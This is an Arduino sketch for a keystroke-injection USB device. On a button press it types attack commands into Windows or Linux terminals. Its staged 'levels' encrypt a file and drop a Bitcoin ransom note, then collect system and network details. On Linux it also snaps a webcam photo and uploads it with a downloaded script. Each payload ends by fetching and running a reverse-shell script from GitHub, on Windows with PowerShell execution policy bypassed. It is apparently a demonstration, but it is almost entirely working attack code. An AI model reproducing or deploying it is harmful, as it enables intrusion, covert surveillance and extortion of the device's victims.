#include <Keyboard.h>

const int buttonPin = 2;         // Pin where the button is connected
const unsigned long debounceDelay = 50;       // Debounce time in milliseconds
const unsigned long doublePressTimeout = 500; // Time limit for detecting a double press

int lastButtonState = HIGH;       // Initial button state for pull-up
bool buttonState = false;         // Track if button is currently "pressed" (true) or "released" (false)
unsigned long lastDebounceTime = 0;
unsigned long buttonPressTime = 0;
int pressCount = 0;
int counter=0;
void setup() {
  pinMode(buttonPin, INPUT_PULLUP);  
  Keyboard.begin();  

  delay(2000); 
}

void loop() {
int reading = digitalRead(buttonPin); // Read the button state

  // Check if button state has changed from the last state
  if (reading != lastButtonState) {
    lastDebounceTime = millis();  // Reset debounce timer if state changed
  }

  // Check if debounce period has passed
  if ((millis() - lastDebounceTime) > debounceDelay) {
    // Button is pressed if reading is LOW (active LOW)
    if (reading == LOW && !buttonState) {
      buttonState = true;            // Update button state to "pressed"
      pressCount++;                  // Increment press count
      buttonPressTime = millis();    // Record time of press
    }
    // Button is released if reading is HIGH
    else if (reading == HIGH && buttonState) {
      buttonState = false;           // Update button state to "released"
    }
  }

  // Check if any press was detected and handle press count
  if (pressCount > 0 && (millis() - buttonPressTime) > doublePressTimeout) {
    if (pressCount == 1 && counter != 0) {
      executeWindowsPayload();  // Single press action
    } else if (pressCount == 2 && counter != 0) {
      executeLinuxPayload();    // Double press action
    }
    pressCount = 0;
    counter++;             // Reset press count after handling
  }

  lastButtonState = reading;  // Update last button state
}

void executeLinuxPayload() {
  // Open terminal (Ctrl+Alt+T)
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();

  delay(500);
  Keyboard.print("curl parrot.live");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(4500);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  // Open a URL in the default browser
  delay(1000);
  Keyboard.print("xdg-open https://protohype.pythonanywhere.com/");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(3500);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  // Save a file
  Keyboard.print("echo 'We can save files on your system' > tmp.txt");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  Keyboard.print("echo 'Level 1 completed'");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(5000);

  // Encrypt `tmp.txt` directly using OpenSSL
  Keyboard.print("openssl enc -aes-256-cbc -salt -in tmp.txt -out tmp.txt.enc -k SuperSecretPassword123");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(1000);
  Keyboard.print("cat tmp.txt.enc");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  // Create a ransom note
  Keyboard.print("echo 'Your files have been encrypted! To decrypt them, send $100 in Bitcoin to the following address: 1BitcoinAddressHere. Level 2 Complete.' > RANSOM_NOTE.txt");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(5000);

  Keyboard.print("echo 'Level 2 completed'");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(5000);

  // Display system information
  Keyboard.print("uname -a");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(5000);
  Keyboard.print("nmcli");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(5000);
  Keyboard.print("q");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.print("ip addr show | grep 'state UP' -A2 | grep 'inet'");
  delay(1000);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(5000);

  Keyboard.print("echo 'Level 3 completed.'");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(5000);

  Keyboard.print("echo 'Level 4 gets personal. Viewer discretion advised.'");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.print("rm output.jpg");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.print("ffmpeg -f video4linux2 -i /dev/video0 -frames:v 1 output.jpg");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.print("rm imgur.sh");
  delay(1000);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.print("wget https://raw.githubusercontent.com/AshwinM17/Rubber_Ducky_Payload_System/refs/heads/main/imgur.sh");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(5000);

  Keyboard.print("chmod 777 imgur.sh");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("./imgur.sh output.jpg");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(9000);

  Keyboard.print("echo 'Level 4 completed.'");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(5000);
  // Print level 4 message and execute a reverse shell command
  Keyboard.print("echo 'For level 5, we will attempt to get shell access.'");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(5000);
  Keyboard.print("rm reverse_shell.py");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);
  // Start a simple reverse shell
  Keyboard.print("wget https://raw.githubusercontent.com/AshwinM17/Rubber_Ducky_Payload_System/refs/heads/main/reverse_shell.py");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(7000);

  Keyboard.print("python3 reverse_shell.py");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

}

void executeWindowsPayload() {
      Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(100);
    Keyboard.releaseAll();

    delay(500);
    Keyboard.print("powershell");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.print("start microsoft-edge:https://protohype.pythonanywhere.com/");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(2500);
    // Close the active browser window
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F4);
    delay(100);
    Keyboard.releaseAll();
    delay(100);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_TAB);
    delay(100);
    Keyboard.releaseAll();
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_TAB);
    delay(100);
    Keyboard.releaseAll();
    Keyboard.print("echo 'We can save files on your system'> tmp.txt");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();

    Keyboard.print("echo 'Level 1 completed'");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(5000);


  Keyboard.print("wget https://raw.githubusercontent.com/AshwinM17/Rubber_Ducky_Payload_System/main/script.ps1 -OutFile script.ps1");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(5000);  
  Keyboard.print("powershell -ExecutionPolicy Bypass -File .\\script.ps1 .\\tmp.txt");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(1000);  
  Keyboard.print("cat .\\tmp.txt.enc");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500); 
  // ransom note
  Keyboard.print("echo 'Your files have been encrypted! To decrypt them, send $100 in Bitcoin to the following address: 1BitcoinAddressHere. Level 2 Complete.' > RANSOM_NOTE.txt");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(5000); 

  Keyboard.print("Get-ComputerInfo");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(9000); 
  Keyboard.print("Get-NetAdapter | Format-Table Name, Status, MacAddress, LinkSpeed");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(9000);
  Keyboard.print("Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(9000); 

  Keyboard.print("echo 'Level 3 completed.'");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(5000);
  Keyboard.print("echo 'For level 4, we  will try to get shell.'");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(5000);  
  Keyboard.print("wget https://raw.githubusercontent.com/AshwinM17/Rubber_Ducky_Payload_System/main/windows_reverse.ps1 -OutFile rev_script.ps1");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(5000);  
  Keyboard.print("powershell -ExecutionPolicy Bypass -File .\\rev_script.ps1");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(9000);  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('c');
  delay(100);
  Keyboard.releaseAll();
  delay(500);


}


